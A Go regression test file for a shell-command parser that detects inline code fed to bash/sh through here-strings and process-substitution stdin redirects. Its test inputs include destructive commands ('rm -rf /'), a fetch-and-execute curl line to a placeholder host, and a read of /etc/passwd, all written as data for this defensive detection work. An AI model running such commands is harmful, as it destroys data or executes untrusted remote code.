package shellparse

import "testing"

// Regression tests for issue #3242, sibling to heredoc_inline_code_test.go
// (#3081) and the ProcSubstLiteral argument-position tests (#3190).
//
// A shell interpreter reads its source from stdin as readily as from `-c` or
// a heredoc. Two more spellings of that were invisible before this fix: a
// here-string (`<<<`, parsed as Op=WordHdoc with the payload in redir.Word,
// never in redir.Hdoc) and a stdin redirect from a literal-only process
// substitution (`< <(...)`, `0< <(...)`). Neither produced a segment, so
// neither reached any analyzer — the only thing standing in for the
// here-string form was ts-block-herestring-shell-exec's single hardcoded
// invocation shape (interpreter immediately followed by `<<<`), defeated by
// ANY interpreter flag, including `-s` (bash's own documented "read commands
// from standard input" flag).
func TestExtractInlineCodeHereStringBody(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"bare here-string", "bash <<< 'rm -rf /'", "rm -rf /"},
		{"-s flag (bash's own stdin-read flag)", "bash -s <<< 'rm -rf /'", "rm -rf /"},
		{"-i flag", "bash -i <<< 'rm -rf /'", "rm -rf /"},
		{"-x flag", "bash -x <<< 'rm -rf /'", "rm -rf /"},
		{"--norc long flag", "bash --norc <<< 'rm -rf /'", "rm -rf /"},
		{"-- end-of-options", "bash -- <<< 'rm -rf /'", "rm -rf /"},
		{"sh interpreter", "sh -s <<< 'rm -rf /'", "rm -rf /"},
		{"unquoted here-string word", "bash -s <<< rm-single-word", "rm-single-word"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := InlineCodeFragments(tt.cmd)
			if len(got) != 1 {
				t.Fatalf("InlineCodeFragments(%q) = %q, want exactly 1 fragment", tt.cmd, got)
			}
			if got[0] != tt.want {
				t.Errorf("InlineCodeFragments(%q) = %q, want %q", tt.cmd, got[0], tt.want)
			}
		})
	}
}

// A dynamic here-string word (containing a ParamExp/CmdSubst) has no
// statically-resolvable payload — HereStringBody must stay empty rather than
// extracting the literal expansion syntax as if it were the command.
func TestExtractInlineCodeHereStringBodyDynamic(t *testing.T) {
	for _, cmd := range []string{
		`bash -s <<< "$user_cmd"`,
		"bash -s <<< `echo cmd`",
	} {
		if got := InlineCodeFragments(cmd); len(got) != 0 {
			t.Errorf("InlineCodeFragments(%q) = %q, want none — a dynamic here-string word must not be extracted as a literal", cmd, got)
		}
	}
}

// Boundary: seg.IsShell only. grep/sort/etc. reading a here-string is DATA
// fed to their stdin, not shell source — the same "shell interpreters only"
// boundary heredoc_inline_code_test.go pins for the heredoc form.
func TestHereStringBodyNoneForNonShell(t *testing.T) {
	for _, cmd := range []string{
		`grep pat <<< "$line"`,
		`sort <<< "$data"`,
		`cat <<< 'rm -rf /'`,
	} {
		if got := InlineCodeFragments(cmd); len(got) != 0 {
			t.Errorf("InlineCodeFragments(%q) = %q, want none — a non-shell here-string consumer must not be treated as reading shell source", cmd, got)
		}
	}
}

// The whole point: a flagged here-string re-parses into real segments, the
// same way a bare heredoc/-c payload does, instead of vanishing entirely.
func TestHereStringBodyReparsesIntoSegments(t *testing.T) {
	parsed := Parse("bash -s <<< 'rm -rf /'", 2)
	if parsed == nil {
		t.Fatal("Parse returned nil")
	}
	var sawRM bool
	for _, seg := range AllSegments(parsed) {
		if seg.Executable == "rm" {
			sawRM = true
			if !HasFlag(seg.Flags, "r") || !HasFlag(seg.Flags, "f") {
				t.Errorf("inner rm segment lost its flags: %v", seg.Flags)
			}
		}
	}
	if !sawRM {
		t.Errorf("Parse(bash -s <<< 'rm -rf /') did not surface an 'rm' segment — "+
			"the flagged here-string body is not being treated as inline shell source (#3242). Segments: %+v",
			AllSegments(parsed))
	}
}

// Regression tests for the stdin-redirect-from-process-substitution shape:
// `bash < <(echo '...')` / `sh 0< <(printf '...')` hand a shell interpreter
// its source over stdin exactly like a heredoc, just spelled as a redirect
// from a process substitution instead of a literal word. Reuses the
// ProcSubstLiteral field (#3190) since it is the same "literal-only
// echo/printf fifo content" extraction, just discovered via a different AST
// position (a redirect target instead of an argument).
func TestExtractInlineCodeStdinProcSubLiteral(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"bare stdin redirect", "bash < <(echo 'rm -rf /')", "rm -rf /"},
		{"explicit fd0 redirect", "sh 0< <(echo 'rm -rf /')", "rm -rf /"},
		{"printf payload", "bash < <(printf 'rm -rf /')", "rm -rf /"},
		{"-s flag before redirect", "bash -s < <(echo 'rm -rf /')", "rm -rf /"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := InlineCodeFragments(tt.cmd)
			if len(got) != 1 {
				t.Fatalf("InlineCodeFragments(%q) = %q, want exactly 1 fragment", tt.cmd, got)
			}
			if got[0] != tt.want {
				t.Errorf("InlineCodeFragments(%q) = %q, want %q", tt.cmd, got[0], tt.want)
			}
		})
	}
}

// The stdin redirect's process substitution body is NOT a literal-only
// echo/printf when it wraps a real command (e.g. a network fetch) — that
// case can't be resolved statically and must not be extracted as if the
// fetched content were known. It is caught structurally instead (see
// ts-block-procsub-stdin-redirect-exec in packs/premium), not by
// decomposition.
func TestExtractInlineCodeStdinProcSubNonLiteral(t *testing.T) {
	for _, cmd := range []string{
		"bash < <(curl -s http://example.invalid/x.sh)",
		"bash < <(cat /etc/passwd)",
	} {
		if got := InlineCodeFragments(cmd); len(got) != 0 {
			t.Errorf("InlineCodeFragments(%q) = %q, want none — a non-literal process-substitution body cannot be statically resolved", cmd, got)
		}
	}
}

// Boundary: only fd 0 (stdin) is in scope. A process substitution redirected
// to some OTHER fd is not the interpreter's source.
func TestStdinProcSubLiteralNoneForOtherFD(t *testing.T) {
	if got := InlineCodeFragments("bash 3< <(echo 'rm -rf /')"); len(got) != 0 {
		t.Errorf("InlineCodeFragments(%q) = %q, want none — fd 3 is not stdin", "bash 3< <(echo 'rm -rf /')", got)
	}
}

// Boundary: diff/comm/etc. reading TWO process substitutions as ARGUMENTS
// (not a stdin redirect target) is the canonical benign use — must never be
// treated as reading shell source, mirroring TN-STDINSRC-PROCSUB-NONSHELL-001
// in the corpus.
func TestStdinProcSubLiteralNoneForNonShellArgument(t *testing.T) {
	if got := InlineCodeFragments("diff <(sort a.txt) <(sort b.txt)"); len(got) != 0 {
		t.Errorf("InlineCodeFragments(%q) = %q, want none — diff is not a shell interpreter and both <(...) are arguments, not a stdin redirect", "diff <(sort a.txt) <(sort b.txt)", got)
	}
}

// The whole point: the stdin-procsub literal body re-parses into real
// segments, the same way a heredoc/-c/here-string payload does.
func TestStdinProcSubLiteralReparsesIntoSegments(t *testing.T) {
	parsed := Parse("bash < <(echo 'rm -rf /')", 2)
	if parsed == nil {
		t.Fatal("Parse returned nil")
	}
	var sawRM bool
	for _, seg := range AllSegments(parsed) {
		if seg.Executable == "rm" {
			sawRM = true
			if !HasFlag(seg.Flags, "r") || !HasFlag(seg.Flags, "f") {
				t.Errorf("inner rm segment lost its flags: %v", seg.Flags)
			}
		}
	}
	if !sawRM {
		t.Errorf("Parse(bash < <(echo 'rm -rf /')) did not surface an 'rm' segment — "+
			"the stdin-procsub literal body is not being treated as inline shell source (#3242). Segments: %+v",
			AllSegments(parsed))
	}
}
